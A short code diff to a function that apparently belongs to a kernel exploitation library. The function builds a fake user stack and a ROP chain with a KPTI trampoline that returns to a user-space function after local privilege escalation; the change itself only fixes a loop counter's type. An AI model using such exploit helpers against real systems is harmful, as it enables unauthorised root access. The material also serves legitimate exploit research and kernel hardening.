@@ -37,7 +37,7 @@ void RopUtils::Ret2Usr(RopChain& rop, void* after_lpe_func, size_t stack_size,
   auto fake_stack = (uint64_t)mmap(NULL, stack_size, PROT_READ | PROT_WRITE,
                                    MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
   auto stack_start = fake_stack + stack_size - redzone_size;
-  for (int i = 0; i < redzone_size - 7; i += 8)
+  for (size_t i = 0; i < redzone_size - 7; i += 8)
     *(uint64_t*)(stack_start + i) = 0xffffff4545454545;  // use canonical address
   rop.AddRopAction(RopActionId::KPTI_TRAMPOLINE,
                    {(uint64_t)after_lpe_func, _user_cs, _user_rflags,
